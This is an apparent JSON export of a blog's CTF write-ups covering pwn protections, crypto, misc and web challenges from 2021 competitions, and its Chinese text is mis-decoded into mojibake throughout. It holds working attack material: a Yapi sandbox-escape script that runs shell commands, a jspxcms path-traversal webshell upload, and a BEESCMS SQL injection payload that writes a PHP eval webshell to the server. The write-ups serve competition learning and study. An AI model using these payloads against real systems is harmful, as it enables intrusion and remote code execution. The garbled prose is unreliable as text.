‡è®°ä¸ºä¸å¯çŸ¥æ€§ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ ˆä¸Šæ•°æ®ã€‚ â€‹ canaryé‡‘ä¸é›€ä¿æŠ¤ï¼Œæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶åŸç†æ˜¯åœ¨å‡½æ•°å…¥å£å¤„ï¼Œå…ˆä» fs/gs å¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª 4(eax)/8(rax) å­—èŠ‚çš„ cookie ä¿¡æ¯å­˜åˆ°æ ˆä¸Šï¼Œå½“å‡½æ•°ç»“æŸè¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³•(ä¸å¼€å§‹å­˜çš„æ˜¯å¦ä¸€è‡´)ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚çœŸæ­£çš„ cookie ä¿¡æ¯ä¹Ÿä¼šä¿å­˜åœ¨ç¨‹åºçš„æŸä¸ªä½ç½®ã€‚æ’å…¥æ ˆä¸­çš„ cookie ä¸€èˆ¬åœ¨ ebp / rbp ä¹‹ä¸Šçš„ä¸€ä¸ªå†…å­˜å•å…ƒä¿å­˜ã€‚ æ”»å‡» Stack smashï¼ˆå¾…è¡¥å……ï¼‰ TLS çº¿ç¨‹å±€éƒ¨å­˜å‚¨ (TLS) æ˜¯ä¸€ç§å­˜å‚¨æŒç»­æœŸï¼ˆstorage durationï¼‰ï¼Œå¯¹è±¡çš„å­˜å‚¨æ˜¯åœ¨çº¿ç¨‹å¼€å§‹æ—¶åˆ†é…ï¼Œçº¿ç¨‹ç»“æŸæ—¶å›æ”¶ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è¯¥å¯¹è±¡è‡ªå·±çš„å®ä¾‹ã€‚ TLS å…·æœ‰ TCB ç»“æ„ä½“ã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹äº TLS çš„å˜é‡ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰è‡ªå·±ç‹¬æœ‰çš„ä¸€ä»½ï¼Œæ—¢ç„¶ç»´æŠ¤ canary çš„ TCB ç»“æ„ä½“æ˜¯ TLS çš„ï¼Œå°±ä¸èƒ½æƒ³åˆ°è¿™ä¸ªç»“æ„ä½“å¿…ç„¶ä¼šåœ¨çº¿ç¨‹è‡ªå·±ç”³è¯·çš„ç©ºé—´é‡Œé¢ï¼Œå¹¶ä¸”åœ¨ä½œæ¯”è¾ƒæ—¶ä¹Ÿæ˜¯å’Œè‡ªå·±ç‹¬æœ‰çš„é‚£ä¸€ä»½æ¯”è¾ƒçš„ã€‚TCB ç»“æ„ä½“æ˜¯æ˜¯ä»¥ fs ä½œä¸ºåŸºå€ç´¢å¼•çš„ï¼ŒTCB ç»“æ„ä½“çš„å®šä¹‰ï¼š 12345678910111213141516171819202122232425262728typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];&#125; tcbhead_t; åœ¨ gdb é‡Œé¢çœ‹ fs é™„è¿‘çš„å†…å­˜åˆ†å¸ƒæƒ…å†µï¼Œä½¿ç”¨ fsbase æŸ¥çœ‹ fs çš„å€¼ï¼Œå†…å­˜åˆ†å¸ƒå’Œç»“æ„ä½“å®šä¹‰ä¸€è‡´ï¼Œæ‰€ä»¥ fs å°±æ˜¯æŒ‡å‘ TCB ç»“æ„ä½“ï¼Œvmmap ä¸€ä¸‹ä¼šå‘ç° TCB æ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œè€Œä¸”æ˜¾ç„¶å»ºç«‹çš„æ—¶é—´åœ¨ test_thread ä¹‹å‰ï¼Œåˆç”±äºå¯ä»¥æ ˆæº¢å‡ºæ¥è¿‘ 0x1000 ä¸ªå­—èŠ‚ï¼Œå®Œå…¨å¯ä»¥è¦†å†™ TCB ç»“æ„ä½“ï¼ŒæŠŠ TCB çš„ stack_guard å­—æ®µå†™æˆæ¯”å¦‚ p64(0)ï¼Œé‚£ä¹ˆæº¢å‡ºåˆ° canary çš„æ—¶å€™è¦†å†™æˆ 0 å°±å¯ä»¥ bypass canaryã€‚ â€‹ PIEPIEï¼ˆPosition Independent Executablesï¼‰æ˜¯ç¼–è¯‘å™¨ï¼ˆgccï¼Œâ€¦ï¼‰åŠŸèƒ½é€‰é¡¹ï¼ˆ-fPIE / -fpieï¼‰ï¼Œä½œç”¨äºç¼–è¯‘è¿‡ç¨‹ï¼Œå¯å°†å…¶ç†è§£ä¸ºç‰¹æ®Šçš„ PICï¼ˆsoä¸“ç”¨ï¼ŒPosition Independent Codeï¼‰ï¼ŒåŠ äº† PIE é€‰é¡¹ç¼–è¯‘å‡ºæ¥çš„ ELF ç”¨ file å‘½ä»¤æŸ¥çœ‹ä¼šæ˜¾ç¤ºå…¶ä¸º soï¼Œå…¶éšæœºåŒ–äº† ELF è£…è½½å†…å­˜çš„åŸºå€ï¼ˆä»£ç æ®µã€pltã€gotã€data ç­‰å…±åŒçš„åŸºå€ï¼‰ã€‚å…¶æ•ˆæœä¸ºç”¨ objdumpã€IDA åæ±‡ç¼–ä¹‹åçš„åœ°å€æ˜¯ç”¨åç§»è¡¨ç¤ºçš„è€Œä¸æ˜¯ç»å¯¹åœ°å€ã€‚ â€‹ RELRORELROï¼ˆReLocation Read-Onlyï¼‰ï¼Œå †æ ˆåœ°å€éšæœºåŒ–ï¼Œ æ˜¯ä¸€ç§ç”¨äºåŠ å¼ºå¯¹ binary æ•°æ®æ®µçš„ä¿æŠ¤çš„æŠ€æœ¯ã€‚ Partial RELRO ï¼ŒGOT éƒ¨åˆ†çš„é PLT éƒ¨åˆ†ï¼ˆæ¥è‡ª readelf è¾“å‡ºçš„ .gotï¼‰æ˜¯åªè¯»çš„ï¼Œä½† .got.plt ä»ç„¶æ˜¯å¯å†™çš„ã€‚ Full RELROï¼Œæ•´ä¸ª GOTï¼ˆ.got å’Œ .got.pltï¼‰éƒ½è¢«æ ‡è®°ä¸ºåªè¯»ã€‚ GOTå…¨ç§° Global Offset Table å…¨å±€åç§»è¡¨ã€‚â€œ.got.pltâ€ æ˜¯GOTçš„ä¸€éƒ¨åˆ†ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ â€œ.gotâ€ã€‚â€œ.gotâ€å­˜æ”¾å…¨å±€å˜é‡å¼•ç”¨åœ°å€ã€‚â€.got.pltâ€å­˜æ”¾å‡½æ•°å¼•ç”¨åœ°å€ã€‚ â€‹ SROPï¼ˆé¢„ç•™ï¼‰ â€‹ BROPï¼ˆé¢„ç•™ï¼‰ â€‹ å…¶ä»–éšæœºæ•°ï¼ˆsrand+randï¼‰glibcéšæœºæ•°å‘ç”Ÿå™¨ ä½¿ç”¨pythonçš„ctypeåº“ï¼ŒLoadLibraryï¼Œå¯¼å…¥libc.so.6ã€‚ä½¿ç”¨æ–¹æ³•ç±»ä¼¼Cçš„LoadLibraryï¼Œä½†æ˜¯ä¸ç”¨åˆ›å»ºå‡½æ•°æŒ‡é’ˆï¼Œå·²ç»å°è£…å¥½äº†ã€‚ 12345678910111213from pwn import *from ctypes import *s = remote(&quot;ip&quot;,&quot;port&quot;)libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)libc.srand(libc.time(0))for i in range(50): rand = str(libc.rand()%6+1) s.sendline(rand)s.interactive() â€‹ é™åˆ¶ç»•è¿‡å…³é—­è¾“å‡ºclose(1); =&gt; exec 1&gt;&amp;0","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"æ ˆ","slug":"æ ˆ","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"}],"author":"Lazzaro"},{"title":"2021DASCTF July X CBCTF 4th","slug":"match-2021DASCTF-July-X-CBCTF-4th","date":"2021-08-01T10:13:02.000Z","updated":"2021-08-02T15:57:40.821Z","comments":true,"path":"2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","permalink":"https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","excerpt":"","text":"â€‹ 2021 DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥é¢„çƒ­èµ›DASCTF July x CBCTF 4thä¸»åŠå•ä½: å®‰æ’ä¿¡æ¯ã€æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ç«èµ›æ—¶é—´: 2021å¹´7æœˆ31æ—¥10:00- 2021å¹´8æœˆ1æ—¥18:00æŠ¥åæ—¶é—´: 2021å¹´7æœˆ15æ—¥10:00-2021å¹´7æœˆ31æ—¥10:00æŠ¥ååœ°å€: https://buuoj.cn/dasæŠ¥åæ–¹å¼: ç™»å½•åç‚¹å‡»[ä¸ªäººä¿¡æ¯]å®Œå–„ä¸ªäººä¿¡æ¯&gt;ç‚¹å‡»[å‚ä¸æƒ…å†µ]åˆ›å»ºæˆ˜é˜Ÿ-&gt;åˆ†äº«æˆ˜é˜ŸTokenç»™è‡ªå·±çš„é˜Ÿå‘˜-&gt;ç­‰å¾…æ¯”èµ›å¼€å§‹ç«èµ›æ–¹å¼: å›¢é˜Ÿèµ›(æœ€å¤šä¸‰äººä¸€ç»„)å‘½é¢˜æˆ˜é˜Ÿ: 0rays Rank: 42 CRYPTOYusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrick å¥½ä¹…ä¸è§ï¼Œä¸Šè¯¾å‰å…ˆç­¾ä¸ªåˆ°å­ï¼æ­¤é¢˜ nc è¿æ¥ã€‚ 123456789101112131415161718192021222324252627from Crypto.Cipher import AESimport osdef pad(a): size = (16-len(a)%16)%16 a += chr(size)*size return aiv = os.urandom(16)key = os.urandom(16)enc = AES.new(key,AES.MODE_CBC,iv)print(iv.encode(&#x27;hex&#x27;))for _ in range(2): try: trick = raw_input(&quot;&quot;) trick = pad(trick.decode(&#x27;hex&#x27;)) cipher = enc.encrypt(trick) if trick == cipher and trick != &quot;&quot; : with open(&quot;flag.txt&quot;) as f: print(f.read()) exit() else: print(cipher.encode(&#x27;hex&#x27;)) print(&quot;Try again&quot;) except: exit() AES-CBCæ¨¡å¼åŸç†ã€‚ ç¬¬ä¸€æ¬¡ï¼š ä»¤ P0 = IV C0 = Encrypt(P0 XOR IV) = Encrypt(0) ç¬¬äºŒæ¬¡ï¼š ä»¤ P1 = C0 C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1 â€‹ MISCred_vs_blue çº¢é˜Ÿå’Œè“é˜Ÿå°†å¼€å±•66è½®å¯¹æŠ—ï¼Œä½ èƒ½é¢„æµ‹å‡ºæ¯è½®å¯¹æŠ—çš„ç»“æœå—ï¼Ÿ ncè¿æ¥ åŒä¸€æ¬¡è¿æ¥å†…ï¼Œé”™è¯¯å¯ä»¥åå¤ä»å¤´çŒœï¼Œ66æ¬¡éšæœºç»“æœä¸å˜ï¼Œå­˜å‚¨ä¹‹å‰çŒœå¯¹çš„æ­£ç¡®ç»“æœï¼Œé”™è¯¯æ—¶å†é‡çŒœå½“å‰æ¬¡æ•°çš„å¦ä¸€ç§ç»“æœå³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233from pwn import *r=remote(&#x27;node4.buuoj.cn&#x27;,29203)r.recvline()r.recvline()r.recvline()ans=[&#x27;?&#x27;]*67i=1while i&lt;=66: print(r.recvline()) r.recvline() if ans[i]==&#x27;?&#x27;: r.sendline(&#x27;r&#x27;) r.recvline() r.recvline() x=r.recvline() if &#x27;success&#x27; in x: ans[i]=&#x27;r&#x27; i+=1 elif &#x27;Sorry&#x27; in x: ans[i]=&#x27;b&#x27; r.sendlineafter(&#x27;Play again? (y/n): &#x27;,&#x27;y&#x27;) i=1 else: r.sendline(ans[i]) r.recvline() r.recvline() r.recvline() i+=1 print(ans)print(r.recvall()) â€‹ funny_maze ä¸ƒæœˆè¢«å›°åœ¨äº†è¿·å®«é‡Œï¼Œåç§’åè¿·å®«çš„ç»ˆç‚¹å°±è¦æ°¸è¿œæ¶ˆå¤±äº†ï¼Œä½ èƒ½å¸®å¥¹èµ°å‡ºè¿·å®«å—ï¼Ÿ nc è¿æ¥ DFSç®—æ³•èµ°è¿·å®«ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *p=remote(&#x27;node4.buuoj.cn&#x27;,27139)def get_sol(maze): if len(path) &gt; 0: print(&#x27;\\n&#x27;.join(&#x27;&#x27;.join(row) for row in maze)) solution = &#x27;&#x27;.join(path)[::-1] print(solution) global path path = [] return solutiondef dfs(maze, y, x): if maze[y][x] in (&#x27; &#x27;,&#x27;S&#x27;): tag = &#x27;o&#x27; maze[y][x] = tag if dfs(maze, y, x+1) == True: tag = &#x27;R&#x27; path.append(tag) elif dfs(maze, y+1, x) == True: tag = &#x27;D&#x27; path.append(tag) elif dfs(maze, y, x-1) == True: tag = &#x27;L&#x27; path.append(tag) elif dfs(maze, y-1, x) == True: tag = &#x27;U&#x27; path.append(tag) else: tag = &#x27; &#x27; maze[y][x] = tag return (tag != &#x27; &#x27;) elif maze[y][x] == &#x27;E&#x27;: return True return Falsefor i in range(5): p.recvline()p.sendline(&#x27;1&#x27;)while 1: maze = [] first = p.recvline().strip() if &#x27;#&#x27; not in first: print(first) print(p.recvall()) break leng = len(first) maze.append(list(first)) for i in range(leng-1): now = p.recvline().strip() maze.append(list(now)) start = [] for y in range(0,len(maze)): for x in range(0,len(maze[y])): if maze[y][x] == &#x27;S&#x27;: start = [y,x] path = [] dfs(maze, start[0], start[1]) sol = get_sol(maze) print(sol) p.recvline() p.sendline(str(len(sol)+1)) p.recvline() p.recvline() p.recvline() â€‹ ezSteganography æœ‰æ‰‹å°±è¡Œçš„éšå†™ 10M+ pngå›¾ã€‚ zstegåœ¨Gé€šé“å‘ç°éšå†™å¦ä¸€pngå›¾ï¼Œæ–‡å­—åªæœ‰ä¸€åŠflagï¼š æŸ¥æ‰¾QIMç®—æ³•ï¼š é‡åŒ–ç´¢å¼•è°ƒåˆ¶ç®—æ³•(QIM)æ˜¯ä¸€ç§ç»å…¸çš„æ°´å°ç®—æ³•ï¼Œå®ƒæ ¹æ®æ°´å°ä¿¡æ¯ï¼ŒæŠŠåŸå§‹è½½ä½“æ•°æ®ç”¨é‡åŒ–å™¨é‡åŒ–åˆ°ä¸åŒçš„ç´¢å¼•åŒºé—´ï¼Œèƒ½åœ¨è·å–è¾ƒé«˜çš„é²æ£’æ€§åŒæ—¶ï¼Œå…·æœ‰è¾ƒå°åµŒå…¥å¤±çœŸã€‚QIMç®—æ³•èƒ½æœ‰æ•ˆæŠµæŠ—æ»¤æ³¢ã€å™ªå£°ã€å‰ªåˆ‡ç­‰å¸¸è§æ”»å‡»ã€‚ æ‰¾åˆ°å…·ä½“å®ç°ä»£ç ï¼Œå°†è¾“å…¥ä»ä¸€ç»´ä¿®æ”¹ä¸ºäºŒç»´å›¾åƒçŸ©é˜µï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;from __future__ import print_functionimport sysimport osHOME = os.environ[&quot;HOME&quot;]import numpy as npclass QIM: def __init__(self, delta): self.delta = delta def embed(self, x, m): &quot;&quot;&quot; x is a vector of values to be quantized individually m is a binary vector of bits to be embeded returns: a quantized vector y &quot;&quot;&quot; x = x.astype(float) d = self.delta y = np.round(x/d) * d + (-1)**(m+1) * d/4. return y def detect(self, z): &quot;&quot;&quot; z is the received vector, potentially modified returns: a detected vector z_detected and a detected message m_detected &quot;&quot;&quot; shape = z.shape z = z.flatten() m_detected = np.zeros_like(z, dtype=float) z_detected = np.zeros_like(z, dtype=float) z0 = self.embed(z, 0) z1 = self.embed(z, 1) d0 = np.abs(z - z0) d1 = np.abs(z - z1) gen = zip(range(len(z_detected)), d0, d1) for i, dd0, dd1 in gen: if dd0 &lt; dd1: m_detected[i] = 0 z_detected[i] = z0[i] else: m_detected[i] = 1 z_detected[i] = z1[i] z_detected = z_detected.reshape(shape) m_detected = m_detected.reshape(shape) return z_detected, m_detected.astype(int) def random_msg(self, l): &quot;&quot;&quot; returns: a random binary sequence of length l &quot;&quot;&quot; return np.random.choice((0, 1), l)def test_qim(): &quot;&quot;&quot; tests the embed and detect methods of class QIM &quot;&quot;&quot; #l = 10000 # binary message length delta = 20 # quantization step qim = QIM(delta) #x = np.random.randint(0, 255, l).astype(float) # host sample #msg = qim.random_msg(l) #y = qim.embed(x, msg) from PIL import Image img = Image.open(&#x27;ezSteganography-flag.png&#x27;) y = np.array(img) z_detected, msg_detected = qim.detect(y) new_img = Image.fromarray(np.uint8(255*msg_detected)) new_img.save(&#x27;part2.png&#x27;) #print(x) #print(msg) print(y) print(z_detected) #print(msg) print(msg_detected) #assert np.allclose(msg, msg_detected) # compare the original and detected messages #assert np.allclose(y, z_detected) # compare the original and detected vectorsdef main(): test_qim()if __name__ == &quot;__main__&quot;: sys.exit(main()) å¾—åˆ°éšå†™pngæ°´å°å›¾ç‰‡ï¼š â€‹ WEBezrce ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ Yapiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ³¨å†Œå¹¶ç™»å½•è´¦å·ï¼Œæ·»åŠ é¡¹ç›®ï¼Œé€‰æ‹©è®¾ç½®ï¼Œè®¾ç½®å…¨å±€mockè„šæœ¬ï¼š 123456const sandbox = thisconst ObjectConstructor = this.constructorconst FunctionConstructor = ObjectConstructor.constructorconst myfun = FunctionConstructor(&#x27;return process&#x27;)const process = myfun()mockJson = process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString() æ‰“å¼€è„šæœ¬ï¼Œæ·»åŠ ä¸€ä¸ªæ¥å£ï¼Œè®¿é—®Mockåœ°å€å³å¯æˆåŠŸRCEã€‚ â€‹ jspxcms http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/ é¶æœºæ¯ååˆ†é’Ÿé‡ç½®ä¸€æ¬¡ã€‚ Jspxcmsè§£å‹getshellæ¼æ´ã€‚ å‚è€ƒä¿¡æ¯ç™»å½•åå°/cmscp/index.doï¼Œadmin/ç©º å¼±å£ä»¤è¿›å…¥åå°ï¼Œåœ¨æ–‡ä»¶ç®¡ç†å¯ä¸Šä¼ æ–‡ä»¶ã€‚ è™½ç„¶èƒ½ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†åœ¨JspDispatcherFilter.javaé™åˆ¶äº†å¯¹jspæ–‡ä»¶çš„è®¿é—®ï¼Œä½†å¯ä¸Šä¼ å¹¶è§£å‹zipæ–‡ä»¶ï¼Œå› WebFileUploadsController.javaé‡Œçš„unzipæ–¹æ³•è°ƒç”¨äº†ä¸‹å±‚æ–¹æ³•å´æ²¡æœ‰è¿›è¡Œæ–‡ä»¶åæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥ç›®å½•ç©¿é€ã€‚ å°†å¤§é©¬cmd.waræ‰“åŒ…ä¸Šä¼ å¹¶è§£å‹ï¼Œé»˜è®¤æ”¾åœ¨\\webapps\\ROOT\\uploads\\1\\ä¸‹ï¼Œå†ä¿®æ”¹æ–‡ä»¶åä¸º../../../cmd.warå³å¯å°†cmd.warç½®äºwebappsæ ¹ç›®å½•ä¸‹ï¼Œå¯è‡ªåŠ¨è§£æã€‚ è®¿é—®/cmdæŸ¥çœ‹æ ¹ç›®å½•flagã€‚ â€‹ cybercms èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ Hint: ä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½ ä¸‹è½½æºç www.zipï¼Œåœ¨/admin/version.phpä¸­å‘ç°æ­¤ä¸ºBEESCMS v4.0æ”¹çš„CMSã€‚ æ‰¾åˆ°åå°ç™»å½•é¡µé¢å­˜åœ¨Beescms_v4.0 SQLæ³¨å…¥æ¼æ´ï¼Œä¸åŒåœ¨äºè¿‡æ»¤å‡½æ•°é™¤äº†fl_valueå’Œfl_htmlï¼Œè¿˜å¤šäº†ä¸ªf1_vvvï¼š 1234567891011121314151617function fl_value($str)&#123; if(empty($str))&#123;return;&#125; return preg_replace(&#x27;/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file|outfile/i&#x27;,&#x27;&#x27;,$str);&#125;define(&#x27;INC_BEES&#x27;,&#x27;B&#x27;.&#x27;EE&#x27;.&#x27;SCMS&#x27;);function fl_html($str)&#123; return htmlspecialchars($str);&#125;function f1_vvv($str)&#123; if(empty($str))&#123;return;&#125; if(preg_match(&quot;/\\ /i&quot;, $str))&#123; exit(&#x27;Go away,bad hacker!!&#x27;); &#125; preg_replace(&#x27;/0x/i&#x27;,&#x27;&#x27;,$str); return $str;&#125; fl_valueè¿‡æ»¤å…³é”®å­—ï¼Œå¯åŒå†™ç»•è¿‡ï¼› f1_htmlä¸­htmlspecialcharsåªå¯¹åŒå¼•å·ç¼–ç ï¼Œå¯ç”¨å•å¼•å·ç»•è¿‡ï¼› f1_vvvä¸­è¿‡æ»¤ç©ºæ ¼å’Œ0xï¼Œç©ºæ ¼å¯æ³¨é‡Šç»•è¿‡ï¼Œ0xåŒå†™ç»•è¿‡ã€‚ payload: user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24 å†™å…¥shellï¼Œèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•æ‰¾åˆ°flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"GKCTF x DASCTFåº”æ€¥æŒ‘æˆ˜æ¯","slug":"match-GKCTFxDASCTFåº”æ€¥æŒ‘æˆ˜æ¯","date":"2021-06-26T09:31:36.000Z","updated":"2021-06-29T11:50:57.838Z","comments":true,"path":"2021/06/26/match-GKCTFxDASCTFåº”æ€¥æŒ‘æˆ˜æ¯/","permalink":"https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/","excerpt":"","text":"â€‹ æŒ‡å¯¼å•ä½: ä¸­å›½ç§»åŠ¨é€šä¿¡è”åˆä¼šä¸»åŠå•ä½: é˜²ç¾ç§‘æŠ€å­¦é™¢ä¿¡æ¯å·¥ç¨‹å­¦é™¢æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æœ¬æ¬¡å‘½é¢˜: Ginkgoæˆ˜é˜Ÿæ¯”èµ›æ—¶é—´: 2021å¹´6æœˆ26æ—¥09:00-17:00æŠ¥åæ—¶é—´: 2021å¹´6æœˆ21æ—¥19:30-6æœˆ26æ—¥9:00æŠ¥ååœ°å€: buuoj.cn/das Rank: 40 CryptoRandom flagæ ¼å¼ä¸º GKCTF{} 12345678910111213import randomfrom hashlib import md5def get_mask(): file = open(&quot;random.txt&quot;,&quot;w&quot;) for i in range(104): file.write(str(random.getrandbits(32))+&quot;\\n&quot;) file.write(str(random.getrandbits(64))+&quot;\\n&quot;) file.write(str(random.getrandbits(96))+&quot;\\n&quot;) file.close()get_mask()flag = md5(str(random.getrandbits(32)).encode()).hexdigest()print(flag) Pythonä¸­randomæ¨¡å—é‡‡ç”¨æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼ˆMT19937ï¼‰ç”Ÿæˆä¼ªéšæœºåºåˆ—ä¸­çš„å…ƒç´ ï¼Œè¯¥PRNGé‡‡ç”¨32ä½çš„stateå’Œ32ä½çš„è¾“å‡ºï¼Œåœ¨è·å¾—è¶³å¤Ÿè¿ç»­è¾“å‡ºçš„æƒ…å†µä¸‹ï¼Œæ¢…æ£®æ—‹è½¬ç®—æ³•æ¥ä¸‹æ¥çš„è¾“å‡ºå€¼æ˜¯å¯ä»¥å‡†ç¡®é¢„æµ‹çš„ã€‚ æ ¹æ® random.txt ä¸­104ç»„ random.getrandbits() å‡½æ•°è¾“å‡ºå€¼ï¼Œåˆ©ç”¨é¢„æµ‹å·¥å…· Mersenne Twister Predictor æ¥æ±‚å‡ºä¸‹ä¸€ä¸ªéšæœºæ•°ï¼š 12345678910111213141516171819202122import randomfrom mt19937predictor import MT19937Predictorfrom hashlib import md5predictor = MT19937Predictor()file = open(&quot;random.txt&quot;,&quot;r&quot;).readlines()c1 = []c2 = []c3 = []for k in range(0,len(file),3): c1 += [int(file[k].strip())] c2 += [int(file[k+1].strip())] c3 += [int(file[k+2].strip())]for k in range(104): predictor.setrandbits(c1[k], 32) predictor.setrandbits(c2[k], 64) predictor.setrandbits(c3[k], 96)print(md5(str(predictor.getrandbits(32)).encode()).hexdigest())#14c71fec812b754b2061a35a4f6d8421 â€‹ Miscç­¾åˆ° å¸ˆå‚…ä»¬ç©çš„å¼€å¿ƒ~ï¼ˆflagç”±flagå¤´åŒ…è£¹ ç”¨Wiresharkæ‰“å¼€æµé‡åŒ…æ–‡ä»¶ tmpshell.pcapngï¼Œè¿½è¸ªTCPæµï¼Œä»ç¬¬3ä¸ªæµå¼€å§‹æœ‰HTTP POSTæ•°æ®åŒ…ï¼Œéƒ½ä¸º /g1nkgo/tmpshell.php çš„RCEç»“æœã€‚ çœ‹åˆ°ç¬¬5ä¸ªæµæœ‰ cat /f14g å‘½ä»¤ç»“æœï¼Œä¸‹è½½ä¸‹æ¥16è¿›åˆ¶æŸ¥çœ‹ï¼Œä»æ–‡ä»¶å¤´ 1f8b0800000000000003 çŸ¥ä¸ºgzipæ–‡ä»¶ï¼Œè§£å‹ï¼Œé€†åº+base64è§£ç å¾—ï¼š [å›è½¦] [å›è½¦] [å›è½¦] ffllaagg{{}}WWeellcc))[åˆ é™¤] [åˆ é™¤] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!! ä¸¤ä¸ªç›¸åŒå­—ç¬¦ä¸€ç»„è¿˜åŸå¾—flagã€‚ â€‹ é—®å·è°ƒæŸ¥ https://www.wjx.cn/vj/Y3msOw2.aspx æ„Ÿè°¢å„ä½å¸ˆå‚…å‚ä¸æœ¬æ¬¡æ¯”èµ›ã€‚ å¡«é—®å·ã€‚ â€‹ ä½ çŸ¥é“apngå— ï¼ˆflagç”±flagå¤´åŒ…è£¹ apngå›¾ç‰‡ï¼ˆåŠ¨æ€pngå›¾ç‰‡ï¼‰ï¼Œç”¨apngdiså·¥å…·æå–å„å¸§ï¼Œå‘ç°ç¬¬2ã€18ã€26å¸§æœ‰äºŒç»´ç ã€‚ QR_Researchèƒ½è¯†åˆ«å‡ºç¬¬18å¸§ä¸º -ad20ï¼Œä»¥åŠç¬¬26å¸§ä¸º -0327-288a235370ea&#125;ï¼Œç¬¬2å¸§å˜å½¢äºŒç»´ç æ— æ³•è¯†åˆ«ï¼Œç”¨åœ¨çº¿å·¥å…·qrazyboxç…§ç€æ‰‹ç»˜ï¼Œå¾—åˆ°ç»“æœ flag&#123;a3c7e4e5ã€‚ flagåº”ä¸ºuuidå½¢å¼ï¼Œè¿˜å°‘ä¸€æ®µï¼ŒæŒ‰ç…§2ã€18ã€26çš„é—´éš”ï¼Œåº”è¯¥åœ¨ç¬¬10å¸§é‡Œï¼ŒstegsolveæŸ¥çœ‹ç¬¬10å¸§ï¼Œåœ¨Red 2é€šé“çœ‹åˆ°äºŒç»´ç ï¼Œè¯†åˆ«ç»“æœ -9b9dã€‚ æ‹¼æ¥å¾—flagã€‚ â€‹ é“¶æå²›ã®å¥‡å¦™å†’é™© é“¾æ¥: https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ å¯†ç : 04m0 é“¾æ¥ï¼šhttps://share.weiyun.com/hdikz5gL å¯†ç ï¼šyjyh3g æ¸¸æˆé¢˜ 1.æ¸¸æˆå¯åŠ¨éœ€è¦java1.8ç¯å¢ƒï¼Œæ— javaç¯å¢ƒä¼šè‡ªåŠ¨å¸®åŠ©å®‰è£…javaç¯å¢ƒï¼Œå¦‚æœä½ å·²ç»æœ‰java1.8ç¯å¢ƒï¼Œå³å¯æ— è§†è¿™æ¡ä¿¡æ¯ 2.å¯åŠ¨ â€œç‚¹å‡»å¯åŠ¨.exeâ€ 